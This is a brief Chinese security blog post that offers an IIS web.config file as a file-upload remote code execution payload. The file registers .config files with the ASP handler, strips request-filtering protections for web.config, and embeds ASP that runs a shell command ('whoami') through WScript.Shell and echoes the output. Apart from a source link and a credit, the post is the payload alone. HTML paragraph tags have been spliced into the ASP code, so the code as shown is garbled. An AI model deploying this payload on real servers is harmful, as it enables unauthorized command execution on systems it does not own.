---
categories: Web安全
date: "2018-11-04T00:00:00Z"
description: tips
title: Web.config RCE
url: /archivers/2018-11-04/1
---

tips
<!--more-->

## Web.config

谢谢@九世分享。

来源：https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<!–
<% Response.write("-"&"->")
Response.write("</p>
<pre>")</p>
<p>Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("whoami")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing</p>
<p>Response.write(output1)
Response.write("</pre>
<p><!-"&"-") %>
–>
```